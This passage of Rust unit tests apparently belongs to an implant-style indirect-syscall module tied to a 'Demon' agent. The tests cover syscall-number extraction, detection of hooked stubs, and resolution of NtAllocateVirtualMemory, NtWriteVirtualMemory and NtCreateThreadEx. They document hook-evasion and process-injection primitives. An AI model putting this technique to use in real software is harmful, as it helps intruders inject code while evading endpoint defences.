    /// `SyscallEntry::is_resolved` returns `false` for a default entry.
    #[test]
    fn default_entry_is_unresolved() {
        let entry = SyscallEntry::default();
        assert!(!entry.is_resolved());
    }

    /// `SyscallEntry::is_resolved` returns `true` when `indirect_addr` is set.
    #[test]
    fn resolved_entry_reports_resolved() {
        let entry = SyscallEntry { indirect_addr: 0xDEAD_BEEF, ssn: 42, _pad: 0 };
        assert!(entry.is_resolved());
    }

    /// The `SyscallEntry` repr(C) layout must match Demon's `SYS_CONFIG` exactly.
    ///
    /// offset 0: indirect_addr (8 bytes)
    /// offset 8: ssn           (4 bytes)
    /// offset 12: _pad         (4 bytes)
    /// total: 16 bytes
    #[test]
    fn syscall_entry_layout() {
        assert_eq!(std::mem::size_of::<SyscallEntry>(), 16);
        assert_eq!(std::mem::align_of::<SyscallEntry>(), 8);
        let entry = SyscallEntry { indirect_addr: 0x11223344_55667788, ssn: 0xAABB, _pad: 0 };
        let raw = unsafe {
            std::slice::from_raw_parts(
                &entry as *const SyscallEntry as *const u8,
                std::mem::size_of::<SyscallEntry>(),
            )
        };
        // indirect_addr at offset 0, little-endian.
        assert_eq!(&raw[0..8], &0x11223344_55667788u64.to_le_bytes());
        // ssn at offset 8, little-endian.
        assert_eq!(&raw[8..12], &0x0000_AABBu32.to_le_bytes());
    }

    /// SSN extraction from a known clean x64 NT stub pattern.
    ///
    /// The bytes `4C 8B D1 B8 <ssn_lo> <ssn_hi> 00 00 0F 05 C3` represent:
    ///   mov r10, rcx
    ///   mov eax, <ssn>
    ///   syscall
    ///   ret
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn extract_ssn_finds_pattern() {
        // Build a fake NT stub with SSN = 0x0042.
        let stub: [u8; 11] = [
            0x4C, 0x8B, 0xD1, // mov r10, rcx
            0xB8, 0x42, 0x00, 0x00, 0x00, // mov eax, 0x42
            0x0F, 0x05, // syscall
            0xC3, // ret
        ];
        let ssn = imp::extract_ssn(stub.as_ptr());
        assert_eq!(ssn, Some(0x0042));
    }

    /// SSN extraction must return `None` when the stub starts with a hook jump.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn extract_ssn_returns_none_for_hooked_stub() {
        // Simulated hooked stub: starts with a `jmp rel32` (0xE9 ...).
        let hooked: [u8; 11] = [0xE9, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC3];
        assert!(imp::extract_ssn(hooked.as_ptr()).is_none());
    }

    /// `find_syscall_instruction` locates the `0F 05` pattern within a stub.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn find_syscall_instruction_locates_syscall() {
        let stub: [u8; 11] = [
            0x4C, 0x8B, 0xD1, 0xB8, 0x42, 0x00, 0x00, 0x00, 0x0F, 0x05, // syscall at offset 8
            0xC3,
        ];
        let addr = imp::find_syscall_instruction(stub.as_ptr());
        assert_eq!(addr, Some(stub[8..].as_ptr() as u64));
    }

    /// `find_syscall_instruction` returns `None` when no syscall is present.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn find_syscall_instruction_returns_none_when_absent() {
        let stub: [u8; 5] = [0x4C, 0x8B, 0xD1, 0xB8, 0xC3];
        assert!(imp::find_syscall_instruction(stub.as_ptr()).is_none());
    }

    /// SSN extraction with a non-zero high byte (e.g., SSN = 0x0123).
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn extract_ssn_handles_high_byte() {
        let stub: [u8; 11] = [
            0x4C, 0x8B, 0xD1, 0xB8, 0x23, 0x01, 0x00, 0x00, // SSN = 0x0123
            0x0F, 0x05, 0xC3,
        ];
        assert_eq!(imp::extract_ssn(stub.as_ptr()), Some(0x0123));
    }

    /// On non-Windows, all NT wrappers return `STATUS_NOT_SUPPORTED`.
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    #[test]
    fn nt_wrappers_return_not_supported_on_non_windows() {
        assert_eq!(
            nt_allocate_virtual_memory(0, std::ptr::null_mut(), 0, std::ptr::null_mut(), 0, 0),
            STATUS_NOT_SUPPORTED
        );
        assert_eq!(
            nt_write_virtual_memory(0, std::ptr::null(), std::ptr::null(), 0, std::ptr::null_mut()),
            STATUS_NOT_SUPPORTED
        );
        assert_eq!(nt_close(0), STATUS_NOT_SUPPORTED);
        assert_eq!(nt_terminate_process(0, 0), STATUS_NOT_SUPPORTED);
    }

    /// On Windows, `init()` must succeed and the table must be populated.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn init_resolves_table_on_windows() {
        init().expect("syscall table init must succeed on Windows");
        let tbl = table().expect("table must be present after init");
        assert!(
            tbl.nt_allocate_virtual_memory.is_resolved(),
            "NtAllocateVirtualMemory must be resolved"
        );
        assert!(tbl.nt_write_virtual_memory.is_resolved(), "NtWriteVirtualMemory must be resolved");
        assert!(tbl.nt_create_thread_ex.is_resolved(), "NtCreateThreadEx must be resolved");
        assert!(tbl.nt_close.is_resolved(), "NtClose must be resolved");
    }

    /// On Windows, resolved SSNs must be plausible (non-zero, less than 0x1000).
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn resolved_ssns_are_plausible() {
        init().expect("init must succeed");
        let tbl = table().expect("table must be present");
        // NtClose is SSN 0x0F on Windows 10/11; allow a generous range.
        assert!(tbl.nt_close.ssn < 0x1000, "NtClose SSN={} is implausibly large", tbl.nt_close.ssn);
        assert_ne!(tbl.nt_close.ssn, 0, "NtClose SSN must not be zero");
    }

    /// On Windows, the indirect_addr must point to a `syscall` instruction.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn indirect_addr_points_to_syscall_instruction() {
        init().expect("init must succeed");
        let tbl = table().expect("table must be present");
        let addr = tbl.nt_allocate_virtual_memory.indirect_addr;
        assert_ne!(addr, 0, "indirect_addr must not be null");
        // Read the 2 bytes at the address and verify they are `0F 05` (syscall).
        let bytes = unsafe { std::slice::from_raw_parts(addr as *const u8, 2) };
        assert_eq!(
            bytes,
            &[0x0F, 0x05],
            "indirect_addr must point to a syscall (0F 05) instruction"
        );
    }
}
